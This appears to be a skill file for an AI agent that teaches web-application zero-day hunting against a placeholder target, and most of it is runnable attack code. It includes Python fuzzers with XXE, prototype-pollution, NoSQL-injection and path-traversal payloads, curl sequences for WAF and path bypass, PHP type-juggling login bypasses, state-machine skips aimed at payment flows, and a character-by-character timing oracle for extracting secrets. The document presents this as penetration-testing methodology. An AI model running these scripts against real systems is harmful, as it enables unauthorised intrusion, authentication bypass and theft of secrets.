---
name: zero-day-hunting
description: Zero-day discovery methodology using behavioral fuzzing, parser differentials, type confusion, encoding gaps, and state machine violations to find novel vulnerabilities that have no CVE
---

# Zero-Day & Novel Vulnerability Discovery

Find vulnerabilities that have no CVE, no nuclei template, and no scanner signature. This skill teaches you to think like a vulnerability researcher — not a scanner operator. You are looking for behaviors that the developers never anticipated and that no public advisory describes.

## Mindset Shift

**Known-vuln testing**: "Does this parameter have SQLi?" → test known payloads → confirm/deny.
**Zero-day hunting**: "What does this parameter do?" → understand behavior → find deviations → chain anomalies → prove exploitability.

You are not testing against a checklist of known CVEs. You are reverse-engineering the application's behavior to find flaws the developers don't know about.

## Attack Surface Selection

Not every parameter is worth deep analysis. Prioritize:

1. **Parameters that showed partial anomalies in earlier phases** — Unusual errors, partial reflection, inconsistent response sizes, timing variations
2. **Complex parsing endpoints** — File uploads, XML/JSON/YAML parsers, serialization, template rendering, PDF generation, image processing
3. **State-changing operations** — Payment, registration, password reset, role assignment, token generation
4. **Multi-component boundaries** — Where CDN hands off to WAF, where reverse proxy hands off to app server, where app calls internal microservices
5. **Newly deployed features** — Check `Last-Modified`, deployment timestamps, version headers for recently changed code

## Technique 1: Behavioral Differential Fuzzing

### Methodology

For each high-value parameter, establish a behavioral baseline then systematically mutate to detect anomalies.

### Step 1: Baseline Measurement

```bash
# Capture baseline response characteristics
curl -sk "https://TARGET/endpoint?param=normalvalue" \
  -o /tmp/baseline.txt -w "HTTP/%{http_code} Size:%{size_download} Time:%{time_total}s\n"

# Record: status code, response size, response time, content-type, error patterns
wc -c /tmp/baseline.txt
md5sum /tmp/baseline.txt
```

### Step 2: Systematic Mutation Categories

```python
import requests, time, hashlib, urllib.parse
requests.packages.urllib3.disable_warnings()

target = "https://TARGET/endpoint"
param = "PARAM"
baseline = requests.get(f"{target}?{param}=normalvalue", verify=False, timeout=15)
baseline_size = len(baseline.content)
baseline_hash = hashlib.md5(baseline.content).hexdigest()
baseline_time = baseline.elapsed.total_seconds()
baseline_status = baseline.status_code

print(f"Baseline: {baseline_status} | {baseline_size}b | {baseline_time:.3f}s | {baseline_hash[:12]}")
print("=" * 80)

# Category 1: Type confusion
type_mutations = [
    ("array[]", f"{param}[]=value1&{param}[]=value2"),
    ("object{}", f"{param}[key]=value"),
    ("nested_array", f"{param}[][nested]=value"),
    ("integer", f"{param}=99999999999999999"),
    ("negative", f"{param}=-1"),
    ("float", f"{param}=1.0e308"),
    ("boolean_true", f"{param}=true"),
    ("boolean_false", f"{param}=false"),
    ("null_string", f"{param}=null"),
    ("undefined", f"{param}=undefined"),
    ("NaN", f"{param}=NaN"),
    ("Infinity", f"{param}=Infinity"),
    ("empty", f"{param}="),
    ("max_int32", f"{param}=2147483647"),
    ("overflow_int32", f"{param}=2147483648"),
    ("max_int64", f"{param}=9223372036854775807"),
    ("overflow_int64", f"{param}=9223372036854775808"),
]

# Category 2: Encoding differentials
encoding_mutations = [
    ("double_url", f"{param}=%2561%256c%2565%2572%2574"),  # double-encoded "alert"
    ("unicode_norm", f"{param}=\uff41\uff44\uff4d\uff49\uff4e"),  # fullwidth "admin"
    ("overlong_utf8", f"{param}=%c0%ae%c0%ae%c0%af"),  # overlong UTF-8 ../
    ("null_byte", f"{param}=value%00.jpg"),
    ("backspace", f"{param}=admi%08n"),
    ("utf8_bom", f"{param}=%ef%bb%bfvalue"),
    ("rtl_override", f"{param}=%e2%80%8fvalue"),  # RTL override
    ("zero_width", f"{param}=val%e2%80%8bue"),  # zero-width space inside value
    ("unicode_dot", f"{param}=value%e3%80%82com"),  # ideographic full stop
    ("halfwidth_forms", f"{param}=%ef%bd%b1"),  # halfwidth katakana
]

# Category 3: Boundary values
boundary_mutations = [
    ("empty_string", f"{param}="),
    ("single_char", f"{param}=a"),
    ("long_5000", f"{param}={'A'*5000}"),
    ("long_50000", f"{param}={'B'*50000}"),
    ("all_spaces", f"{param}={'%20'*100}"),
    ("all_newlines", f"{param}={'%0a'*100}"),
    ("all_nulls", f"{param}={'%00'*50}"),
    ("format_string", f"{param}=%25s%25s%25s%25s%25n"),
    ("regex_bomb", f"{param}={'(a+)+'*10}"),
    ("json_in_param", f"{param}=" + urllib.parse.quote('{"__proto__":{"x":1}}')),
    ("xml_in_param", f"{param}=" + urllib.parse.quote('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>')),
]

# Category 4: Parser confusion
parser_mutations = [
    ("content_length_0", None),  # Send with Content-Length: 0
    ("duplicate_param", f"{param}=value1&{param}=value2"),  # HPP
    ("triple_param", f"{param}=v1&{param}=v2&{param}=v3"),
    ("mixed_case_param", f"{param.upper()}=VALUE"),
    ("trailing_dot", f"{param}.=value"),
    ("bracket_param", f"{param}{{}}=value"),
    ("semicolon_sep", f"{param}=val1;{param}=val2"),
]

all_mutations = type_mutations + encoding_mutations + boundary_mutations + parser_mutations
for label, query_string in all_mutations:
    if query_string is None:
        continue
    try:
        start = time.time()
        url = f"{target}?{query_string}"
        r = requests.get(url, verify=False, timeout=15)
        elapsed = time.time() - start
        resp_size = len(r.content)
        resp_hash = hashlib.md5(r.content).hexdigest()

        # Anomaly detection
        anomalies = []
        if r.status_code != baseline_status:
            anomalies.append(f"STATUS:{r.status_code}")
        if abs(resp_size - baseline_size) > baseline_size * 0.3:  # >30% size change
            anomalies.append(f"SIZE:{resp_size}({resp_size - baseline_size:+d})")
        if elapsed > baseline_time * 3:  # >3x slower
            anomalies.append(f"SLOW:{elapsed:.2f}s")
        if resp_hash != baseline_hash and r.status_code == baseline_status:
            anomalies.append("CONTENT_CHANGED")

        # Check for interesting error patterns
        body = r.text.lower()
        if any(p in body for p in ['traceback', 'stack trace', 'exception', 'at com.', 'at org.',
                                     'node_modules', 'vendor/', 'internal server', 'segfault',
                                     'memory', 'overflow', 'underflow', 'nullptr', 'null pointer',
                                     'type error', 'typeerror', 'cast', 'conversion']):
            anomalies.append("ERROR_LEAK")

        if anomalies:
            print(f"[ANOMALY] {label}: {' | '.join(anomalies)}")
            print(f"   URL: {url[:150]}")
    except requests.exceptions.Timeout:
        print(f"[ANOMALY] {label}: TIMEOUT (>15s)")
    except Exception as e:
        print(f"[ERROR] {label}: {str(e)[:80]}")
```

### Step 3: Deep-Dive on Anomalies

When you find an anomaly, investigate deeper:

```bash
# If STATUS changed — what error is returned?
curl -sk "https://TARGET/endpoint?MUTATION" -v 2>&1 | head -50

# If SLOW — is it query-dependent? (side-channel)
for i in 1 2 3 4 5; do
  time curl -sk "https://TARGET/endpoint?MUTATION" -o /dev/null
done

# If CONTENT_CHANGED — what content changed?
diff <(curl -sk "https://TARGET/endpoint?param=normal") \
     <(curl -sk "https://TARGET/endpoint?MUTATION")

# If ERROR_LEAK — extract full error
curl -sk "https://TARGET/endpoint?MUTATION" | grep -A5 -iE "error|exception|trace|stack"
```

## Technique 2: Parser Differential Attacks

Different layers parse the same HTTP request differently. Exploit the gaps.

### CDN/WAF vs Application Server

```bash
# Test if WAF and app server parse URL differently
# Technique: path confusion
curl -sk "https://TARGET/admin" -o /dev/null -w "%{http_code}\n"          # Blocked by WAF?
curl -sk "https://TARGET/./admin" -o /dev/null -w "%{http_code}\n"        # Path normalization
curl -sk "https://TARGET/;/admin" -o /dev/null -w "%{http_code}\n"        # Semicolon
curl -sk "https://TARGET/%61%64%6d%69%6e" -o /dev/null -w "%{http_code}\n"  # URL encoded
curl -sk "https://TARGET/admin;" -o /dev/null -w "%{http_code}\n"         # Trailing semicolon
curl -sk "https://TARGET/admin%00" -o /dev/null -w "%{http_code}\n"       # Null byte
curl -sk "https://TARGET/admin%20" -o /dev/null -w "%{http_code}\n"       # Trailing space
curl -sk "https://TARGET/ADMIN" -o /dev/null -w "%{http_code}\n"          # Case change
curl -sk "https://TARGET/admin..;/" -o /dev/null -w "%{http_code}\n"      # Tomcat bypass
curl -sk "https://TARGET//admin" -o /dev/null -w "%{http_code}\n"         # Double slash
```

### HTTP Method Differential

```bash
# Does the app handle different methods differently than the WAF expects?
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT PROPFIND; do
  code=$(curl -sk -X $method "https://TARGET/admin" -o /dev/null -w "%{http_code}")
  echo "$method: $code"
done
```

### Header Parsing Differential

```bash
# Different components may parse these headers differently
curl -sk "https://TARGET/admin" -H "X-Original-URL: /admin"
curl -sk "https://TARGET/admin" -H "X-Rewrite-URL: /admin"
curl -sk "https://TARGET/" -H "X-Original-URL: /admin"
curl -sk "https://TARGET/" -H "X-Forwarded-Prefix: /admin"

# Content-Type confusion
curl -sk "https://TARGET/api" -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"test"}'
curl -sk "https://TARGET/api" -X POST \
  -H "Content-Type: application/xml" \
  -d '<root><user>admin</user><pass>test</pass></root>'
# Does the app parse both? Does one bypass input validation?
```

## Technique 3: Type Confusion & Coercion Attacks

### JSON Type Juggling

```python
import requests, json
requests.packages.urllib3.disable_warnings()

url = "https://TARGET/api/endpoint"
headers = {"Content-Type": "application/json"}

# Test type confusion on each JSON parameter
test_cases = [
    {"field": "admin"},          # Normal string
    {"field": True},             # Boolean
    {"field": 1},                # Integer
    {"field": 0},                # Zero (falsy)
    {"field": -1},               # Negative
    {"field": None},             # Null
    {"field": []},               # Empty array
    {"field": {}},               # Empty object
    {"field": [True]},           # Array with boolean
    {"field": {"$gt": ""}},      # NoSQL operator injection
    {"field": {"toString": "x"}},# Prototype pollution probe
    {"field": 1e309},            # Overflow to Infinity
    {"field": "0e999"},          # PHP type juggling (== 0)
    {"field": "true"},           # String "true" vs boolean true
    {"field": ""},               # Empty string
    {"field": " "},              # Whitespace string
]

for tc in test_cases:
    try:
        r = requests.post(url, json=tc, headers=headers, verify=False, timeout=10)
        print(f"{json.dumps(tc):50s} → {r.status_code} | {len(r.content)}b | {r.text[:100]}")
    except Exception as e:
        print(f"{json.dumps(tc):50s} → ERROR: {e}")
```

### PHP Specific Type Juggling

```bash
# Magic hash collisions (PHP == comparison)
# "0e215962017" == 0 in PHP (scientific notation)
curl -sk "https://TARGET/login" -X POST \
  -d "password=0e215962017&username=admin"

# Array vs string comparison bypass
curl -sk "https://TARGET/login" -X POST \
  -d "password[]=&username=admin"

# True vs string comparison
curl -sk "https://TARGET/api" -X POST \
  -H "Content-Type: application/json" \
  -d '{"password":true,"username":"admin"}'
```

## Technique 4: State Machine Violations

### Multi-Step Workflow Abuse

```python
import requests
requests.packages.urllib3.disable_warnings()
s = requests.Session()

# Map the normal flow first
# Step 1: Init → Step 2: Verify → Step 3: Confirm → Step 4: Complete

# Now violate the state machine:

# Attack 1: Skip steps
# Go directly from Step 1 to Step 4
s.post("https://TARGET/step1", data={"action": "init"}, verify=False)
r = s.post("https://TARGET/step4", data={"action": "complete"}, verify=False)
print(f"Skip to final: {r.status_code} | {r.text[:200]}")

# Attack 2: Replay a step
s.post("https://TARGET/step1", data={"action": "init"}, verify=False)
s.post("https://TARGET/step2", data={"action": "verify"}, verify=False)
s.post("https://TARGET/step2", data={"action": "verify"}, verify=False)  # Replay
r = s.post("https://TARGET/step3", data={"action": "confirm"}, verify=False)
print(f"Replay step: {r.status_code} | {r.text[:200]}")

# Attack 3: Reverse order
s.post("https://TARGET/step3", data={"action": "confirm"}, verify=False)
r = s.post("https://TARGET/step1", data={"action": "init"}, verify=False)
print(f"Reverse order: {r.status_code} | {r.text[:200]}")

# Attack 4: Modify state token between steps
s.post("https://TARGET/step1", data={"action": "init"}, verify=False)
# Tamper with session token, CSRF token, or state parameter between steps
```

### Token/Nonce Reuse

```bash
# Get a valid token/OTP/nonce
curl -sk "https://TARGET/get-token" -c cookies.txt -o /tmp/token_response.txt
TOKEN=$(cat /tmp/token_response.txt | grep -oP '"token":"[^"]+' | cut -d'"' -f4)

# Use it once (legitimate)
curl -sk "https://TARGET/use-token" -b cookies.txt -d "token=$TOKEN"

# Use it again (should fail — if it works, that's a bug)
curl -sk "https://TARGET/use-token" -b cookies.txt -d "token=$TOKEN"
echo "Second use should have failed"
```

## Technique 5: Timing Side-Channel Discovery

```python
import requests, time, statistics
requests.packages.urllib3.disable_warnings()

def measure_timing(url, n=5):
    """Measure response time with statistical significance."""
    times = []
    for _ in range(n):
        start = time.time()
        try:
            requests.get(url, verify=False, timeout=15)
        except:
            times.append(15.0)  # timeout
            continue
        times.append(time.time() - start)
    return statistics.mean(times), statistics.stdev(times)

# Compare timing for different input lengths (length oracle)
target = "https://TARGET/api/check"
for length in [1, 5, 10, 20, 50, 100]:
    payload = "a" * length
    mean, std = measure_timing(f"{target}?input={payload}")
    print(f"Length {length:3d}: {mean:.4f}s ± {std:.4f}s")

# Compare timing for character-by-character discovery (timing oracle)
# Useful for password/secret comparison that's not constant-time
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
known = ""
for position in range(8):  # First 8 chars
    best_char = ""
    best_time = 0
    for c in charset:
        test = known + c + "a" * (7 - position)
        mean, _ = measure_timing(f"{target}?secret={test}", n=3)
        if mean > best_time:
            best_time = mean
            best_char = c
    known += best_char
    print(f"Position {position}: '{best_char}' ({best_time:.4f}s) → '{known}'")
```

## Technique 6: Undocumented Functionality Discovery

```python
import requests, json
requests.packages.urllib3.disable_warnings()

# Probe for debug/admin parameters that aren't in the public API
debug_params = [
    "debug=1", "debug=true", "verbose=1", "test=1", "testing=1",
    "_debug=1", "__debug=1", "admin=1", "admin=true", "internal=1",
    "dev=1", "development=1", "staging=1", "preview=1", "beta=1",
    "raw=1", "format=json", "callback=test", "jsonp=test",
    "_method=PUT", "_method=DELETE", "_method=PATCH",
    "include=admin", "expand=all", "fields=__all__",
    "select=*", "populate=*", "depth=99",
    "access_token=test", "api_key=test", "token=test",
]

url = "https://TARGET/api/endpoint"
baseline = requests.get(url, verify=False, timeout=10)
baseline_size = len(baseline.content)

for dp in debug_params:
    try:
        r = requests.get(f"{url}?{dp}", verify=False, timeout=10)
        if len(r.content) != baseline_size or r.status_code != baseline.status_code:
            print(f"[DIFF] ?{dp} → {r.status_code} | {len(r.content)}b (baseline: {baseline_size}b)")
            if len(r.content) > baseline_size:
                print(f"  Extra content: {r.text[baseline_size:baseline_size+200]}")
    except:
        pass

# Probe for hidden HTTP headers that trigger debug mode
debug_headers = [
    ("X-Debug", "1"), ("X-Debug-Mode", "1"), ("X-Debug-Token", "1"),
    ("Debug", "1"), ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"), ("X-Internal", "1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Original-URL", "/admin"), ("X-Rewrite-URL", "/admin"),
]

for header, value in debug_headers:
    try:
        r = requests.get(url, headers={header: value}, verify=False, timeout=10)
        if len(r.content) != baseline_size or r.status_code != baseline.status_code:
            print(f"[DIFF] {header}: {value} → {r.status_code} | {len(r.content)}b")
    except:
        pass
```

## Chaining Novel Behaviors

When you find anomalies, think about chaining:

1. **Error leak + SSRF** — Internal path disclosure reveals internal service architecture → craft SSRF to internal endpoints
2. **Type confusion + auth bypass** — Boolean `true` accepted as password → authentication bypass
3. **Parser differential + content injection** — WAF doesn't see your payload but app server processes it → XSS/injection at WAF-protected endpoints
4. **Timing oracle + brute force** — Character-by-character timing leak → extract secrets
5. **State machine skip + payment** — Skip verification step → complete purchase without payment
6. **Debug parameter + info disclosure** — Hidden debug mode → stack traces with source paths → targeted exploitation

## Validation

1. Every anomaly must be investigated — don't just log it, understand WHY it happens
2. Reproduce the anomaly at least 3 times to rule out flakiness
3. Determine if the anomaly is exploitable or just interesting behavior
4. If exploitable, build a minimal PoC that another researcher can reproduce
5. Document the root cause hypothesis — "the app uses PHP loose comparison" not just "the login accepts boolean true"
6. Classify novel findings with CVSS based on actual demonstrated impact

## Pro Tips

1. Focus your fuzzing on endpoints that showed "interesting" behavior in earlier phases — partial reflection, unusual errors, non-standard status codes
2. Always compare against the baseline — anomalies only matter relative to normal behavior
3. Timing attacks need statistical significance — measure 5+ times and calculate standard deviation
4. Parser differentials are most valuable at CDN/WAF boundaries — check for X-Cache, CF-Cache-Status, Via headers
5. Type confusion is most common in loosely-typed languages (PHP, JavaScript/Node.js) — prioritize these stacks
6. State machine bugs are most common in payment and registration flows — prioritize these business processes
7. When you find one anomaly on an endpoint, test ALL other mutation categories on the same endpoint — bugs cluster

## Summary

Zero-day hunting is systematic anomaly detection. Establish baselines, mutate intelligently across type/encoding/boundary/parser categories, detect deviations, and investigate every anomaly until you understand the root cause. Chain anomalies together for maximum impact. The goal is not to run a checklist — it's to understand the application deeply enough to find what nobody else has found.
